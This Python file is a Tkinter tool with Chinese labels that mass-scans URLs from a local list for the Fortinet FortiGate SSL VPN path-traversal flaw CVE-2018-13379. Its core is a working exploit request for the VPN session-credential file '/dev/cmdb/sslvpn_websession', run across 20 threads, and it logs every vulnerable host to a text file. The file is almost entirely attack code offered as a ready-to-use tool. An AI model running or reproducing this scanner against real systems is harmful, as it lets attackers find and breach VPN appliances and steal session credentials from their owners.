import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Fortigate_CVE_2018_13379_exp(url):
    poc = r"""/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,stream=True,timeout=3)
        if "var fgt_lang = " in res.text:
            Fortigate_CVE_2018_13379_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Fortigate_CVE_2018_13379_text.see(END)
            with open ("存在Fortinet任意文件读取漏洞(CVE-2018-13379)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Fortigate_CVE_2018_13379_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Fortigate_CVE_2018_13379_text.see(END)
    except Exception as err:
        Fortigate_CVE_2018_13379_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Fortigate_CVE_2018_13379_text.see(END)
def get_yyu8_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Fortigate_CVE_2018_13379_gui():
    Fortigate_CVE_2018_13379 = tk.Tk()
    Fortigate_CVE_2018_13379.geometry("910x450")
    Fortigate_CVE_2018_13379.title("Fortinet任意文件读取漏洞(CVE-2018-13379)一把梭")
    Fortigate_CVE_2018_13379.resizable(0, 0)
    Fortigate_CVE_2018_13379.iconbitmap('logo.ico')
    global Fortigate_CVE_2018_13379_text
    Fortigate_CVE_2018_13379_text = scrolledtext.ScrolledText(Fortigate_CVE_2018_13379,width=123, height=25)
    Fortigate_CVE_2018_13379_text.grid(row=0, column=0, padx=10, pady=10)
    Fortigate_CVE_2018_13379_text.see(END)
    addrs = get_yyu8_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Fortigate_CVE_2018_13379_exp, addr)
    Fortigate_CVE_2018_13379.mainloop()